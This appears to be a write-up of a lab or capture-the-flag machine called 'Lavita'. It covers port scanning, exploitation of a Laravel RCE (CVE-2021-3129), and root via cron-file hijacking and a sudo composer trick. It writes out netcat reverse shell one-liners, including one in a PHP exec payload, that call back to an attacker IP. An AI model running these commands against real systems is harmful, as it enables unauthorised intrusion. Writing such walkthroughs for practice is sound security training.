Nmap scan
```sh
nmap -p- --min-rate 5000 -T4 -Pn 192.168.164.38
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-25 10:14 IST
Warning: 192.168.164.38 giving up on port because retransmission cap hit (6).
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 86.57% done; ETC: 10:14 (0:00:05 remaining)
Nmap scan report for 192.168.164.38
Host is up (1.2s latency).
Not shown: 65448 closed tcp ports (reset), 85 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 45.82 seconds
```

```sh
nmap -sC -sV -T4 -Pn -p 22,80 192.168.164.38   
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-25 10:16 IST
Nmap scan report for 192.168.164.38
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: W3.CSS Template
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.21 seconds
```
Visiting web server on port 80.
![](Images/Lavita1.png)
Directory brute forcing.
```sh
ffuf -u http://192.168.164.38/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -e ".txt,.php,.html,.asp,.aspx" -c -fc 403
```

![](Images/Lavita2.png)
![](Images/Lavita3.png)
![](Images/Lavita4.png)
Go to the register page and register an account. We managed to login to the website.
**We were unable to login as internet was slow and because of that we couldn't login.**
![](Images/Lavita5.png)
Checking out the website, I find that entering an invalid URI exposes the back end application and version being used to host the website:
![](Images/Lavita6.png)

Searched for public exploits and we found one RCE exploit.
![](Images/Lavita7.png)
After downloading we were facing below error. So we download from exploit-db but it also didn't work. So we cloned it from github repo.
https://github.com/joshuavanderpoll/CVE-2021-3129
![](Images/Lavita8.png)
After cloning we again face this error. So we found out permanent solution for this type of errors.
```sh
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```
Before running the exploit, please enable the APP_DEBUG.
![](Images/Lavita9.png)

Running the exploit in venv as running it normally gave errors.
![](Images/Lavita10.png)

![](Images/Lavita11.png)
We executed below nc reverse shell as other payloads were not able to give shell.
```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.249 80 >/tmp/f
```

![](Images/Lavita12.png)
Got shell and captured local flag.
![](Images/Lavita13.png)

### Privilege Escalation
we manually tried searching for few things but no luck. So we ran linpeas.
![](Images/Lavita14.png)

Checking linpeas result, don’t have any password for skunk. We do found mysql running locally, we also discover the db password. Login to the db does not found any useful info.

Checking on running service does not have any interesting info as well, either related to skunk or root.

Let use pspy to check if any cronjob run by other user. Because by checking crontab -l and cat /etc/crontab might not show other users cron job. You can download pspy from here.
https://github.com/DominicBreuker/pspy/releases
**Download pspy64**
Transfer it to target machine and run it after giving executing permissions.
![](Images/Lavita15.png)
After watching for a little bit, I find any interesting command line appear:
A custom PHP file called ‘artisan’ is being executed every few minutes by a user with the UID of 1001. Checking the /etc/passwd file, this UID belongs to the user ‘skunk’:

![](Images/Lavita16.png)
![](Images/Lavita17.png)
Additionally, as the www-data user, I control the directory in which this ‘artisan’ file resides, even though I don’t have permissions to write to the file directly:
![](Images/Lavita19.png)
![](Images/Lavita20.png)
This is easy; we can just hijack the artisan file to execute arbitrary PHP commands. And we have access to the file since we are www-data.
```sh
echo '<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.249 4444 >/tmp/f");?>' > artisan
```
We created above payload with help of deepak.
![](Images/Lavita21.png)

We got the shell as skunk.
![](Images/Lavita22.png)
Checking [GTFObin](https://gtfobins.github.io/gtfobins/composer/), we can get root by editing the composer.json file to prompt a shell.
![](Images/Lavita23.png)

First I’ll echo the payload to a file called ‘composer.json’ in the var/www/html/lavita directory as the ‘www-data’ user from my previous shell, since ‘skunk’ doesn’t have permission in this directory:

![](Images/Lavita24.png)
With my file created, I can simply execute it with the sudo command, pointing to the script ‘x’ that is present in the malicious composer.json file:
```sh
sudo /usr/bin/composer --working-dir\=/var/www/html/lavita x
```

![](Images/Lavita25.png)